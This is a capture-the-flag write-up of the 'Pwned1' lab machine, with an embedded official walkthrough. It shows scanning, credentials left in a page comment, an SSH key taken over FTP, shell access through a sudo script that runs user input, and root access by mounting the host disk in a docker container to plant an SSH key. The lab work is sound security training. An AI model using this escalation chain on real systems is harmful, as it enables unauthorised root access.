---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.189.95
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 19:02 +0900
Nmap scan report for 192.168.189.95
Host is up (0.087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.09 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ sudo nmap -Pn -p21,22,80 -sSCV -A -oN full_tcp-scan.txt --open 192.168.189.95
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 19:03 +0900
Nmap scan report for 192.168.189.95
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   84.51 ms  192.168.45.1
2   84.46 ms  192.168.45.254
3   440.18 ms 192.168.251.1
4   440.26 ms 192.168.189.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.21 seconds
```

http://192.168.189.95/hidden_text/secret.dic

![](../../../assets/images/Pasted%20image%2020260524190916.png)

http://192.168.189.95/robots.txt

![](../../../assets/images/Pasted%20image%2020260524191045.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ feroxbuster \
-u http://192.168.189.95 \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt

```

![](../../../assets/images/Pasted%20image%2020260524191321.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ cat word.txt     
/hacked
/vanakam_nanba
/hackerman.gif 
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg 
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ gobuster dir \
-u http://192.168.189.95 \
-w word.txt \                                                            
-x html,php,txt,bak,zip,old \
-t 25 \
-k \
-r \
--random-agent \
-b 403,404 \
-o gobuster.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.189.95
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                word.txt
[+] Negative Status codes:   403,404
[+] User Agent:              Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ja-jp) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7
[+] Extensions:              txt,bak,zip,old,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
pwned.vuln           (Status: 200) [Size: 673]
Progress: 147 / 147 (100.00%)
===============================================================
Finished
===============================================================
```

http://192.168.189.95/pwned.vuln/

![](../../../assets/images/Pasted%20image%2020260524191505.png)

view-source:http://192.168.189.95/pwned.vuln/

```zsh
<!DOCTYPE html> <html> <head> <title>login</title> </head> <body> <div id="main"> <h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1> <form method="POST"> Username <input type="text" name="username" class="text" autocomplete="off" required> Password <input type="password" name="password" class="text" required> <input type="submit" name="submit" id="sub"> </form> </div> </body> </html> <?php // if (isset($_POST['submit'])) { // $un=$_POST['username']; // $pw=$_POST['password']; // // if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') { // echo "welcome" // exit(); // } // else // echo "Invalid creds" // } ?>
```

ftpuser
B0ss_Pr!ncesS

![](../../../assets/images/Pasted%20image%2020260524194817.png)

# FTP

## 21

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ ftp 192.168.189.95
Connected to 192.168.189.95.
220 (vsFTPd 3.0.3)
Name (192.168.189.95:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62027|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||65173|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||60269|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |***********************************************************************|  2602       18.38 MiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (26.88 KiB/s)
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||15018|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |***********************************************************************|    75       53.07 KiB/s    00:00 ETA
226 Transfer complete.
75 bytes received in 00:00 (0.76 KiB/s)
ftp> exit
221 Goodbye.
```

---

# Initial Access


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ cat note.txt  

Wow you are here 

ariana won't happy about this note 

sorry ariana :( 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ chmod 600 id_rsa 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Pwned1]
└─$ ssh -i id_rsa ariana@192.168.189.95                
The authenticity of host '192.168.189.95 (192.168.189.95)' can't be established.
ED25519 key fingerprint is: SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.189.95' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ariana@pwned:~$ 

```

```zsh
ariana@pwned:~$ cat local.tt
cat: local.tt: No such file or directory
ariana@pwned:~$ cat local.txt
```

```zsh
ariana@pwned:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:7e:4a:6c:40 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:42:3d brd ff:ff:ff:ff:ff:ff
    inet 192.168.189.95/24 brd 192.168.189.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:423d/64 scope link 
       valid_lft forever preferred_lft forever
```

```zsh
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

```zsh
ariana@pwned:~$ cat /home/messenger.sh 
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```

---

# Privilege Escalation

```zsh
ariana@pwned:~$ sudo -u selena /home/messenger.sh
```

```zsh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena 
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

```zsh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```zsh
selena@pwned:~$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

```zsh
selena@pwned:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        5 years ago         88.3MB
<none>              <none>              e13ad046d435        5 years ago         88.3MB
alpine              latest              a24bb4013296        5 years ago         5.57MB
debian              wheezy              10fcec6d95c4        7 years ago         88.3MB

```

```zsh
# id
uid=0(root) gid=0(root) groups=0(root)
```

```zsh
cat: '/root/prooo'$'\b\b': No such file or directory
# cat /root/proof.txt

```

```zsh
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Pwned1
Summary
This machine is exploited by disclosure of ftp user credentials and downloadable SSH key in the ftp folder. It is escalated via a vulnerable sudo script and docker group privileges.

Enumeration
Nmap
We start off by running an nmap scan:

kali@kali:~$ nmap 192.168.120.220
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 16:54 EDT
Nmap scan report for 192.168.120.220
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Web application
We start off by exploring the web app. There is nothing really worthy on the main page but the /robots.txt page reveals interesting pages to explore.

kali@kali:~$ curl http://192.168.120.220/robots.txt
# Group 1

User-agent: *
Allow: /nothing
Allow: /hidden_text
Exploring that /hidden_text page, we find a directory listing which leads to /secret.dic page.

kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic
/hacked
/vanakam_nanba
/hackerman.gif
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
We try a few of those but most don't seem to work. Let's automate the tries instead of checking them all one by one.

kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic > /tmp/secret.dic
...

kali@kali:~$ gobuster dir -u http://192.168.120.220 -w /tmp/secret.dic
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.120.220
[+] Threads:        10
[+] Wordlist:       /tmp/secret.dic
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/08 17:11:35 Starting gobuster
===============================================================
//pwned.vuln (Status: 301)
===============================================================
2020/09/08 17:11:36 Finished
===============================================================
We find that only /pwned.vuln is valid. If we go to that page, we can find some credentials in the comments.

kali@kali:~$ curl http://192.168.120.220/pwned.vuln/
<!DOCTYPE html>
<html>
...
<?php
...
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
...
Exploitation
Exploring the FTP server
By using the credentials found earlier, we can log in to the FTP server. In it, we find two interesting files.

kali@kali:~$ ftp 192.168.120.220
Connected to 192.168.120.220.
220 (vsFTPd 3.0.3)
Name (192.168.120.220:vagrant): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa
-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt
226 Directory send OK.
The first one is a private SSH key, and the other one is a note that conveniently contains the associated username.

kali@kali:~$ cat note.txt

Wow you are here

ariana won't happy about this note

sorry ariana :(
SSH
Using the id_rsa key we found, we can SSH to the machine.

kali@kali:~$ chmod 400 id_rsa
kali@kali:~$ ssh -i id_rsa ariana@192.168.120.220
...
ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
Escalation
Local Enumeration
Let's look at the commands our user is allowed to run with sudo.

ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
Let's see this script with cat /home/messenger.sh.

#!/bin/bash

clear
echo "Welcome to linux.messenger "
		echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
		echo ""
echo "$users"
		echo ""
read -p "Enter username to send message : " name
		echo ""
read -p "Enter message for $name :" msg
		echo ""
echo "Sending message to $name "

$msg 2> /dev/null

		echo ""
echo "Message sent to $name :) "
		echo ""
Exploiting the script
Looks like this script is running what we pass to the "Enter message for $name" prompt and then sends it to /dev/null. We can use this to run a shell. Since we run it as sudo, this will give us a shell as the selena user.

ariana@pwned:~$ sudo -u selena /home/messenger.sh

Welcome to linux.messenger


ariana:
selena:
ftpuser:

Enter username to send message : whatever

Enter message for whatever :/bin/bash

Sending message to whatever
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
python3 -c 'import pty; pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$
Escalating to root
In the id command above, we can see that we are in the docker group. This allows us to do very nasty things: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface

Let's see what images are available.

selena@pwned:/home/ariana$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        2 months ago        88.3MB
<none>              <none>              e13ad046d435        2 months ago        88.3MB
alpine              latest              a24bb4013296        3 months ago        5.57MB
debian              wheezy              10fcec6d95c4        18 months ago       88.3MB
alpine images are usually pretty bare bones but any of the other 2 images will do just fine for our needs (privesc is a fairly obvious hint, but we don't need to use that one). As shown by the link above, we can mount the host's / folder inside of a container. Since SSH is open on the machine, we'll use this to edit the root's authorized_keys file.

We can simply paste our host's public key here. If you don't have an SSH key pair created, you can use the ssh-keygen command.

selena@pwned:/home/ariana$ docker run -it -v /:/host debian:wheezy sh
# cd /host/root
# ls -al
total 28
drwx------  3 root root 4096 Jul 10 07:32 .
drwxr-xr-x 18 root root 4096 Aug 11 08:14 ..
-rw-------  1 root root  264 Sep  8 19:53 .bash_history
-rw-r--r--  1 root root  601 Jul  6 12:40 .bashrc
drwxr-xr-x  3 root root 4096 Jul  4 14:02 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  429 Jul 10 06:41 root.txt
# mkdir .ssh
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcKw2si1MnX9Zc2qlnoPvILKv9EI/2hISK4Gy0a6cIMRjys3oxkv5CEBdSMCA33K8IDniHC6vhf1D9xM9fjjEgocu45CJnRtGyX4ewfduqdwkQlOirqStYP9mjkjmqSj65dU3fAk3LZjZNxUjPPY7GvELeJyLzIUlOgnWKKo/sYOcyHcG9PZpQDngcEJ5jbEs/8meNp+ejaGUegyn8TZfG/4Gy18uUkIEV1Muc2Xc9e+KQOWZ3SehxJQwqGZycTGJBy49hA8/1iHOsyQyr/lgnkVewEyB2i9tN7WqrZeMY+DqvDP/qxIHGf4U17NKqM/npAAviH6noeDBZZEQq56Ad kali@kali' > .ssh/authorized_keys
Then we can SSH to the machine as root.

kali@kali:~$ ssh root@192.168.120.220
...
root@pwned:~# id
uid=0(root) gid=0(root) groups=0(root)
```

</details>